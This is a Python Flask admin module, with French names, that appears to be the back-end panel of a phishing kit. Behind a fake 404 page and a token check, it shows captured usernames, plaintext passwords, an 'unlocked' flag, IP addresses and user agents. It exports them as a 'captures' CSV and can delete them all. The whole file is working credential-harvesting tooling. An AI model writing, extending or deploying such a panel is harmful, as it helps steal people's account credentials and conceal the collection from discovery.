import csv
import datetime
import io
import secrets

from flask import (Blueprint, Response, current_app, make_response,
                   render_template, request)

from db import get_db

bp = Blueprint("admin", __name__, url_prefix="/admin")
COOKIE = "adm"


def _autorise():
    attendu = current_app.config["ADMIN_TOKEN"]
    if not attendu:
        return False
    fourni = request.args.get("token") or request.cookies.get(COOKIE)
    return bool(fourni) and secrets.compare_digest(fourni, attendu)


def _refus():
    return render_template("admin_404.html"), 404


def _pose_cookie(reponse):
    if request.args.get("token"):
        reponse.set_cookie(
            COOKIE, current_app.config["ADMIN_TOKEN"],
            max_age=60 * 60 * 24 * 30,
            httponly=True, samesite="Lax", secure=not current_app.debug,
        )
    return reponse


@bp.get("/")
def tableau():
    if not _autorise():
        return _refus()

    rows = get_db().execute(
        "SELECT id, identifiant, mot_de_passe, debloque, ip, "
        "to_char(recu_le, 'YYYY-MM-DD HH24:MI') AS recu_le "
        "FROM logins ORDER BY id DESC LIMIT 500"
    ).fetchall()

    reponse = make_response(render_template("admin.html", entrees=rows,
                                            total=len(rows)))
    return _pose_cookie(reponse)


@bp.get("/export.csv")
def export():
    if not _autorise():
        return _refus()

    buf = io.StringIO()
    w = csv.writer(buf, delimiter=";")
    w.writerow(["id", "identifiant", "mot_de_passe", "debloque", "ip", "ua", "recu_le"])
    for r in get_db().execute(
        "SELECT id, identifiant, mot_de_passe, debloque, ip, ua, "
        "to_char(recu_le, 'YYYY-MM-DD HH24:MI') AS recu_le "
        "FROM logins ORDER BY id"
    ):
        w.writerow([r["id"], r["identifiant"], r["mot_de_passe"], r["debloque"],
                    r["ip"], r["ua"], r["recu_le"]])

    horodatage = datetime.datetime.now().strftime("%Y%m%d-%H%M")
    reponse = make_response(buf.getvalue())
    reponse.mimetype = "text/csv"
    reponse.headers["Content-Disposition"] = f"attachment; filename=captures-{horodatage}.csv"
    return _pose_cookie(reponse)


@bp.delete("/logins")
def vider():
    if not _autorise():
        return _refus()

    base = get_db()
    base.execute("DELETE FROM logins")
    base.commit()
    return Response("ok", mimetype="text/plain")